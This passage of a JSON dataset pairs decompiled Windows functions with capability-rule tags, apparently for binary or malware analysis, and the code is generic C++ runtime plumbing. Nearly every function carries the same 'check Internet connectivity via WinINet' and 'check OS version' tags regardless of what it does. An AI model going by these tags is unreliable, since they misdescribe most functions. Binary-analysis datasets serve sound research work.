            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00411c90(int32_t arg_8h, uint arg_ch)\n\n{\n    uint32_t uVar1;\n    uint uVar2;\n    int32_t *in_FS_OFFSET;\n    char *pcVar3;\n    uint var_28h;\n    int32_t var_10h;\n    int32_t var_ch;\n    uint uStack12;\n    uint var_4h;\n    \n    var_4h = 0xffffffff;\n    uStack12 = 0x470d88;\n    var_ch = *in_FS_OFFSET;\n    uVar1 = *0x49106c ^ &stack0xfffffffc;\n    *in_FS_OFFSET = &var_ch;\n    pcVar3 = NULL;\n    uVar2 = fcn.0042550a(0);\n    *(var_10h + 4) = uVar2;\n    if (arg_8h == 0) {\n        pcVar3 = \"bad locale name\";\n        fcn.00425786(\"bad locale name\");\n    }\n    fcn.00405750(arg_8h);\n    var_4h = 0;\n    fcn.00411ae0(&var_28h, arg_ch, arg_8h, pcVar3, uVar1);\n    var_4h = 0xffffffff;\n    fcn.004055f0();\n    *in_FS_OFFSET = var_ch;\n    return var_10h;\n}\n",
        "token_count": 312
    },
    "00411d20": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n\nuint32_t __cdecl fcn.00411d20(uint arg_8h)\n\n{\n    uint8_t uVar1;\n    uint8_t *puVar2;\n    bool bVar3;\n    uint var_1ch;\n    uint var_18h;\n    uint32_t var_14h;\n    uint8_t *var_10h;\n    uint8_t *var_ch;\n    uint8_t *var_8h;\n    uint var_1h;\n    \n    var_ch = 0x4821d4;\n    puVar2 = fcn.00411a50();\n    do {\n        var_8h = puVar2;\n        uVar1 = *var_8h;\n        bVar3 = uVar1 < *var_ch;\n        if (uVar1 != *var_ch) {\ncode_r0x00411d78:\n            var_8h = -bVar3 | 1;\n            var_10h = var_8h;\n            goto code_r0x00411d80;\n        }\n        if (uVar1 == 0) break;\n        uVar1 = var_8h[1];\n        bVar3 = uVar1 < var_ch[1];\n        if (uVar1 != var_ch[1]) goto code_r0x00411d78;\n        var_ch = var_ch + 2;\n        puVar2 = var_8h + 2;\n    } while (uVar1 != 0);\n    var_10h = NULL;\ncode_r0x00411d80:\n    var_14h = var_10h == NULL;\n    return var_8h & 0xffffff00 | var_14h;\n}\n",
        "token_count": 381
    },
    "00412b50": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00412b50(int32_t param_1)\n\n{\n    int32_t iVar1;\n    uint var_1ch;\n    uint var_10h;\n    int32_t var_ch;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    var_4h = param_1;\n    iVar1 = fcn.0042664d(param_1);\n    if (iVar1 != 0) {\n        var_ch = var_4h;\n        var_8h = var_4h;\n        if (var_4h == 0) {\n            var_10h = 0;\n        }\n        else {\n            var_10h = fcn.00412c40(1);\n        }\n        fcn.004014d0(\"Fail to schedule the chore!\");\n        fcn.00451487(&var_1ch, 0x48f490);\n    }\n    return;\n}\n",
        "token_count": 206
    },
    "00412f40": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_14h\n\nvoid __fastcall fcn.00412f40(int32_t *param_1)\n\n{\n    int32_t iVar1;\n    int32_t *var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    var_14h = sub.KERNEL32.dll_GetCurrentThreadId();\n    iVar1 = fcn.00417390(param_1 + 2, var_14h, 0);\n    if (iVar1 == 0) {\n        (**(*param_1 + 8))();\n        iVar1 = fcn.00417390(param_1 + 2, 3, var_14h);\n        if (iVar1 == 2) {\n            var_14h = param_1 + 0xd;\n            fcn.00416660(var_14h);\n            *(param_1 + 0x19) = 1;\n            fcn.00416620();\n            fcn.00412290();\n        }\n    }\n    fcn.00412d90();\n    fcn.0043a2e7(var_14h);\n    return;\n}\n",
        "token_count": 265
    },
    "00413130": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00413130(int32_t arg_8h)\n\n{\n    int32_t **in_ECX;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    int32_t *var_8h;\n    int32_t *var_4h;\n    \n    var_4h = *in_ECX;\n    var_8h = NULL;\n    while( true ) {\n        if (var_4h == NULL) {\n            return;\n        }\n        if (*var_4h == arg_8h) break;\n        var_8h = var_4h;\n        var_4h = var_4h[1];\n    }\n    if (var_8h == NULL) {\n        *in_ECX = var_4h[1];\n    }\n    else {\n        var_8h[1] = var_4h[1];\n    }\n    if (var_4h[1] == 0) {\n        in_ECX[1] = var_8h;\n    }\n    fcn.0043a7bc(var_4h);\n    return;\n}\n",
        "token_count": 245
    },
    "00413590": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00413590(int32_t arg_8h)\n\n{\n    int32_t *in_ECX;\n    uint var_4h;\n    \n    if (arg_8h != 0) {\n        fcn.00412d60();\n    }\n    *in_ECX = arg_8h;\n    return;\n}\n",
        "token_count": 74
    },
    "00413ce0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00413ce0(uint arg_8h, uint arg_ch)\n\n{\n    uint32_t arg_8h_00;\n    int32_t iVar1;\n    int32_t *in_FS_OFFSET;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    int32_t var_ch;\n    uint uStack12;\n    uint var_4h;\n    \n    var_4h = 0xffffffff;\n    uStack12 = 0x47103f;\n    var_ch = *in_FS_OFFSET;\n    arg_8h_00 = *0x49106c ^ &stack0xfffffffc;\n    *in_FS_OFFSET = &var_ch;\n    iVar1 = fcn.0043a4f7(0x28, arg_8h_00);\n    var_4h = 0;\n    if (iVar1 == 0) {\n        var_14h = 0;\n    }\n    else {\n        var_14h = fcn.00413bb0(arg_8h);\n    }\n    var_4h = 0xffffffff;\n    fcn.00413920(fcn.00413bd0, var_14h, arg_ch);\n    *in_FS_OFFSET = var_ch;\n    return;\n}\n",
        "token_count": 277
    },
    "00414780": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.00414780(uint arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t in_ECX;\n    int32_t *in_FS_OFFSET;\n    uint *arg_8h_00;\n    uint *arg_8h_01;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint32_t var_10h;\n    int32_t var_ch;\n    uint uStack12;\n    int32_t var_4h;\n    \n    uStack12 = 0x47120f;\n    var_ch = *in_FS_OFFSET;\n    var_10h = *0x49106c ^ &stack0xfffffffc;\n    *in_FS_OFFSET = &fcn.00414780::var_ch;\n    var_4h = 0;\n    fcn.00401b10(8);\n    arg_8h_01 = &fcn.00414780::arg_8h;\n    fcn.00414900(arg_8h_01);\n    var_4h._0_1_ = 1;\n    arg_8h_00 = 0x4147d3;\n    iVar1 = fcn.0043a4f7(0x74, arg_8h_01);\n    var_4h._0_1_ = 2;\n    if (iVar1 == 0) {\n        var_24h = 0;\n    }\n    else {\n        fcn.00401b10(0x74);\n        arg_8h_00 = &fcn.00414780::var_18h;\n        var_24h = fcn.00416240(arg_8h_00);\n    }\n    var_4h._0_1_ = 1;\n    *(in_ECX + 0x4c) = var_24h;\n    fcn.00413220(*(in_ECX + 0x4c));\n    var_4h = var_4h._1_3_ << 8;\n    fcn.00415020();\n    var_4h = 0xffffffff;\n    fcn.00416300();\n    *in_FS_OFFSET = var_ch;\n    fcn.0043a2e7(arg_8h_00);\n    return;\n}\n",
        "token_count": 520
    },
    "00414920": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00414920(int32_t param_1)\n\n{\n    uint var_4h;\n    \n    if (*(param_1 + 0x4c) != 0) {\n        fcn.004132f0(*(param_1 + 0x4c));\n        fcn.00412d90();\n        *(param_1 + 0x4c) = 0;\n    }\n    return;\n}\n",
        "token_count": 94
    },
    "00414ba0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00414ba0(int32_t *arg_8h)\n\n{\n    char cVar1;\n    uint32_t uVar2;\n    int32_t *in_FS_OFFSET;\n    uint arg_ch;\n    uint *arg_8h_00;\n    uint uVar3;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint32_t var_10h;\n    int32_t var_ch;\n    uint uStack12;\n    uint var_4h;\n    \n    var_4h = 0xffffffff;\n    uStack12 = 0x4712a8;\n    var_ch = *in_FS_OFFSET;\n    uVar2 = *0x49106c ^ &stack0xfffffffc;\n    *in_FS_OFFSET = &var_ch;\n    uVar3 = 8;\n    var_10h = uVar2;\n    fcn.00401b10(8);\n    arg_8h_00 = &var_18h;\n    (**(*arg_8h + 8))(arg_8h_00, uVar3, uVar2);\n    var_4h = 0;\n    cVar1 = fcn.004149f0();\n    if ((cVar1 == '\\0') || (*(arg_8h + 4) != '\\0')) {\n        fcn.00406250();\n        fcn.00414cc0(arg_8h);\n        var_4h = 0xffffffff;\n        fcn.0040e930();\n    }\n    else {\n        cVar1 = fcn.00414a20();\n        if (cVar1 == '\\0') {\n            uVar3 = 1;\n            fcn.00406250();\n            fcn.00414670(uVar3);\n        }\n        else {\n            arg_ch = 1;\n            uVar3 = fcn.00414a40();\n            fcn.00406250();\n            fcn.004146a0(uVar3, arg_ch);\n        }\n        if (arg_8h != NULL) {\n            (***arg_8h)(1);\n        }\n        var_4h = 0xffffffff;\n        fcn.0040e930();\n    }\n    *in_FS_OFFSET = var_ch;\n    fcn.0043a2e7(arg_8h_00);\n    return;\n}\n",
        "token_count": 526
    },
    "00414f60": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n\nvoid __fastcall fcn.00414f60(int32_t param_1)\n\n{\n    int32_t arg_8h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    arg_8h = *(param_1 + 0x44);\n    *(param_1 + 0x44) = 0;\n    while (arg_8h != 0) {\n        fcn.00414ba0(arg_8h);\n    }\n    return;\n}\n",
        "token_count": 124
    },
    "00415ae0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl\nfcn.00415ae0(uint noname_0, uint noname_1, uint noname_2, uint noname_3, uint noname_4, uint noname_5, uint noname_6, \n            uint noname_7, uint noname_8, uint noname_9, uint noname_10, uint noname_11, uint noname_12, uint noname_13\n            , uint noname_14, uint noname_15, uint noname_16, uint arg_8h)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    int32_t *in_FS_OFFSET;\n    uint var_28h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_10h;\n    uint var_ch;\n    uint var_4h;\n    uint uStack76;\n    uint arg_8h_00;\n    uint var_30h;\n    uchar *var_24h;\n    uchar *var_20h_2;\n    int32_t var_1ch_2;\n    int32_t var_18h_2;\n    uint var_18h_3;\n    uint var_10h_2;\n    uint32_t var_ch_2;\n    int32_t iStack16;\n    uint var_4h_2;\n    uint uStack8;\n    \n    uStack8 = 0xffffffff;\n    var_4h_2 = 0x471378;\n    iStack16 = *in_FS_OFFSET;\n    var_ch_2 = *0x49106c ^ &stack0xfffffffc;\n    *in_FS_OFFSET = &stack0xfffffff0;\n    fcn.00401b10(8);\n    arg_8h_00 = 0x415b24;\n    fcn.00416710(var_18h_2 + 0x14);\n    uStack8 = 0;\n    if ((noname_0 != '\\0') && (*(var_18h_2 + 0x6c) != '\\0')) {\n        uStack76 = 0x415b49;\n        arg_8h_00 = fcn.00415240(&fcn.00415ae0::var_30h, 2);\n        fcn.00426c72(arg_8h_00);\n    }\n    cVar1 = fcn.004117d0();\n    if (cVar1 != '\\0') {\n        var_20h_2 = &stack0xffffffb4;\n        iVar2 = var_18h_2 + 0xc;\n        fcn.00411730(iVar2);\n        fcn.00426c4f(iVar2);\n    }\n    *(var_18h_2 + 0x6c) = 1;\n    uStack76 = 0x415b90;\n    fcn.00416950(&fcn.00415ae0::var_18h_3);\n    while (*(var_18h_2 + 0x70) == 0) {\n        fcn.004122e0(&fcn.00415ae0::var_18h_3);\n    }\n    uStack76 = 0x415bb5;\n    cVar1 = fcn.004117d0();\n    if (cVar1 != '\\0') {\n        var_24h = &stack0xffffffb0;\n        iVar2 = var_18h_2 + 0xc;\n        fcn.00411730(iVar2);\n        fcn.00426c4f(iVar2);\n    }\n    var_1ch_2 = var_18h_2 + 8;\n    uStack8 = 0xffffffff;\n    uStack76 = 0x415bed;\n    fcn.004166c0();\n    *in_FS_OFFSET = iStack16;\n    fcn.0043a2e7(arg_8h_00);\n    return;\n}\n",
        "token_count": 860
    },
    "00415c10": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00415c10(int32_t param_1)\n\n{\n    int32_t arg_8h;\n    int32_t *in_FS_OFFSET;\n    uint var_1ch;\n    uint var_18h;\n    uint32_t var_10h;\n    int32_t var_ch;\n    uint uStack12;\n    uint var_4h;\n    \n    var_4h = 0xffffffff;\n    uStack12 = 0x470f78;\n    var_ch = *in_FS_OFFSET;\n    var_10h = *0x49106c ^ &stack0xfffffffc;\n    *in_FS_OFFSET = &var_ch;\n    fcn.00401b10(8);\n    arg_8h = param_1 + 0x14;\n    fcn.00416710(arg_8h);\n    var_4h = 0;\n    fcn.00416950(&var_18h);\n    while (*(param_1 + 0x70) == 0) {\n        fcn.004122e0(&var_18h);\n    }\n    var_4h = 0xffffffff;\n    fcn.004166c0();\n    *in_FS_OFFSET = var_ch;\n    fcn.0043a2e7(arg_8h);\n    return;\n}\n",
        "token_count": 281
    },
    "00415cb0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00415cb0(code **param_1)\n\n{\n    int32_t *in_FS_OFFSET;\n    uint var_10h;\n    int32_t var_ch;\n    uint uStack12;\n    uint uStack8;\n    \n    uStack8 = 0xffffffff;\n    uStack12 = 0x470140;\n    var_ch = *in_FS_OFFSET;\n    *in_FS_OFFSET = &var_ch;\n    *param_1 = vtable.std::_Associated_state_int_.0;\n    if ((*(param_1 + 0x75) != '\\0') && (param_1[0x1c] == NULL)) {\n        fcn.00412350(param_1 + 5);\n    }\n    fcn.00412270();\n    fcn.00412370();\n    fcn.004116e0();\n    *in_FS_OFFSET = var_ch;\n    return;\n}\n",
        "token_count": 195
    },
    "00416840": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00416840(int32_t *arg_8h)\n\n{\n    int32_t *piVar1;\n    int32_t *in_ECX;\n    uint var_4h;\n    \n    piVar1 = fcn.00401440(arg_8h);\n    if (in_ECX != piVar1) {\n        if (*in_ECX != 0) {\n            fcn.00416ad0();\n        }\n        if (*arg_8h == 0) {\n            *in_ECX = 0;\n        }\n        else {\n            fcn.00401870();\n            *in_ECX = *arg_8h;\n            *(in_ECX + 1) = *(arg_8h + 1);\n        }\n    }\n    return;\n}\n",
        "token_count": 169
    },
    "004168b0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint32_t __fastcall fcn.004168b0(int32_t *param_1)\n\n{\n    uint32_t uVar1;\n    int32_t *in_FS_OFFSET;\n    uint32_t var_14h;\n    uint var_10h;\n    int32_t var_ch;\n    uint uStack12;\n    uint uStack8;\n    \n    uStack8 = 0xffffffff;\n    uStack12 = 0x470210;\n    var_ch = *in_FS_OFFSET;\n    uVar1 = *0x49106c ^ &stack0xfffffffc;\n    *in_FS_OFFSET = &var_ch;\n    if (*param_1 == 0) {\ncode_r0x00416905:\n        var_14h = 0;\n    }\n    else {\n        if (*(param_1 + 1) != '\\0') {\n            param_1 = fcn.00416fd0(uVar1);\n            if ((param_1 & 0xff) != 0) goto code_r0x00416905;\n        }\n        var_14h = 1;\n    }\n    *in_FS_OFFSET = var_ch;\n    return param_1 & 0xffffff00 | var_14h;\n}\n",
        "token_count": 259
    },
    "00416d80": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __fastcall fcn.00416d80(uint param_1)\n\n{\n    int32_t *piVar1;\n    uint *puVar2;\n    uint arg_ch;\n    uint uVar3;\n    uint var_4h;\n    \n    fcn.00406300(param_1);\n    piVar1 = fcn.004072d0();\n    if (*piVar1 != 0) {\n        puVar2 = fcn.00404940();\n        uVar3 = *puVar2;\n        puVar2 = fcn.004072d0();\n        fcn.00417110(*puVar2, uVar3);\n        arg_ch = fcn.00417140();\n        puVar2 = fcn.004072d0();\n        uVar3 = *puVar2;\n        fcn.00404960();\n        fcn.004171e0(uVar3, arg_ch);\n        puVar2 = fcn.004072d0();\n        *puVar2 = 0;\n        puVar2 = fcn.00404940();\n        *puVar2 = 0;\n        puVar2 = fcn.00405fb0();\n        *puVar2 = 0;\n    }\n    return;\n}\n",
        "token_count": 282
    },
    "00416e10": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00416e10(uint32_t arg_8h)\n\n{\n    int32_t iVar1;\n    uint *puVar2;\n    uint32_t uVar3;\n    uint uVar4;\n    uint *puVar5;\n    int32_t *piVar6;\n    uint var_4h;\n    \n    puVar2 = fcn.004072d0();\n    *puVar2 = 0;\n    puVar2 = fcn.00404940();\n    *puVar2 = 0;\n    puVar2 = fcn.00405fb0();\n    *puVar2 = 0;\n    if (arg_8h == 0) {\n        uVar4 = 0;\n    }\n    else {\n        uVar3 = fcn.00417170();\n        if (uVar3 < arg_8h) {\n            fcn.00408ff0();\n        }\n        uVar3 = arg_8h;\n        fcn.00404960();\n        uVar4 = fcn.004171b0(uVar3);\n        puVar2 = fcn.004072d0();\n        *puVar2 = uVar4;\n        puVar2 = fcn.004072d0();\n        puVar5 = fcn.00404940();\n        *puVar5 = *puVar2;\n        piVar6 = fcn.004072d0();\n        iVar1 = *piVar6;\n        piVar6 = fcn.00405fb0();\n        *piVar6 = iVar1 + arg_8h * 4;\n        uVar4 = 1;\n    }\n    return uVar4;\n}\n",
        "token_count": 360
    },
    "00416ef0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00416ef0(uint *arg_8h)\n\n{\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    if (arg_8h != NULL) {\n        (***arg_8h)(1);\n    }\n    return;\n}\n",
        "token_count": 73
    },
    "00416f30": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00416f30(int32_t arg_8h)\n\n{\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    if (arg_8h != 0) {\n        fcn.00412c40(1);\n    }\n    return;\n}\n",
        "token_count": 76
    },
    "00416f70": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00416f70(uint *param_1)\n\n{\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    if (param_1[0x1e] == 0) {\n        if (param_1 != NULL) {\n            (***param_1)(1);\n        }\n    }\n    else {\n        (***param_1[0x1e])(param_1);\n    }\n    return;\n}\n",
        "token_count": 110
    },
    "00417460": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00417460(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    uint arg_8h_00;\n    int32_t *in_FS_OFFSET;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint32_t var_10h;\n    int32_t var_ch;\n    uint uStack12;\n    uint var_4h;\n    \n    var_4h = 0xffffffff;\n    uStack12 = 0x4715e7;\n    var_ch = *in_FS_OFFSET;\n    var_10h = *0x49106c ^ &stack0xfffffffc;\n    *in_FS_OFFSET = &var_ch;\n    iVar1 = fcn.0043a4f7(0x28, var_10h);\n    var_4h = 0;\n    if (iVar1 == 0) {\n        var_20h = 0;\n    }\n    else {\n        uVar2 = fcn.00401440(arg_10h);\n        arg_8h_00 = fcn.00401440(arg_ch);\n        var_20h = fcn.00417d30(arg_8h_00, uVar2);\n    }\n    var_4h = 0xffffffff;\n    fcn.00401b10(8);\n    fcn.00416390();\n    var_4h = 1;\n    uVar2 = fcn.00414a40();\n    fcn.00410f60(uVar2, var_20h);\n    fcn.00410490(&var_18h);\n    var_4h = 0xffffffff;\n    fcn.0040e930();\n    *in_FS_OFFSET = var_ch;\n    fcn.0043a2e7(uVar2);\n    return;\n}\n",
        "token_count": 433
    },
    "004177f0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.004177f0(uint *arg_8h)\n\n{\n    char cVar1;\n    uint *in_ECX;\n    uint var_4h;\n    \n    if ((arg_8h[1] != 0) && (cVar1 = fcn.00411a70(),  cVar1 != '\\0')) {\n        *in_ECX = *arg_8h;\n        in_ECX[1] = arg_8h[1];\n        return 1;\n    }\n    return 0;\n}\n",
        "token_count": 117
    },
    "004178f0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004178f0(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    uint uVar3;\n    int32_t *in_FS_OFFSET;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint32_t var_10h;\n    int32_t var_ch;\n    uint uStack12;\n    uint var_4h;\n    \n    var_4h = 0xffffffff;\n    uStack12 = 0x47168a;\n    var_ch = *in_FS_OFFSET;\n    var_10h = *0x49106c ^ &stack0xfffffffc;\n    *in_FS_OFFSET = &var_ch;\n    iVar1 = fcn.0043a4f7(0x110, var_10h);\n    var_4h = 0;\n    if (iVar1 == 0) {\n        var_20h = 0;\n    }\n    else {\n        uVar2 = fcn.00401440(arg_10h);\n        uVar3 = fcn.00401440(arg_ch);\n        var_20h = fcn.00418240(uVar3, uVar2);\n    }\n    var_4h = 0xffffffff;\n    fcn.00401b10(8);\n    fcn.00416390();\n    var_4h = 1;\n    uVar2 = fcn.00417b00();\n    fcn.00410f60(uVar2, var_20h);\n    fcn.00410490(&var_18h);\n    var_4h = 0xffffffff;\n    fcn.0040e930();\n    *in_FS_OFFSET = var_ch;\n    fcn.0043a2e7(uVar2);\n    return;\n}\n",
        "token_count": 423
    },
    "00417ff0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00417ff0(uint arg_8h, uint arg_ch)\n\n{\n    int32_t arg_8h_00;\n    uint uVar1;\n    uint32_t arg_8h_01;\n    uint32_t uVar2;\n    uint32_t arg_ch_00;\n    int32_t *piVar3;\n    uint *puVar4;\n    uint uVar5;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    uVar1 = fcn.00418c80(arg_8h, arg_ch);\n    arg_8h_01 = fcn.00401440(uVar1);\n    fcn.00406300();\n    uVar2 = fcn.00416ec0();\n    arg_ch_00 = fcn.00417140();\n    if (arg_ch_00 < arg_8h_01) {\n        uVar2 = fcn.00417170();\n        if (uVar2 < arg_8h_01) {\n            fcn.00408ff0();\n        }\n        uVar1 = fcn.00417b70(arg_8h_01);\n        piVar3 = fcn.004072d0();\n        if (*piVar3 != 0) {\n            puVar4 = fcn.00404940();\n            uVar5 = *puVar4;\n            puVar4 = fcn.004072d0();\n            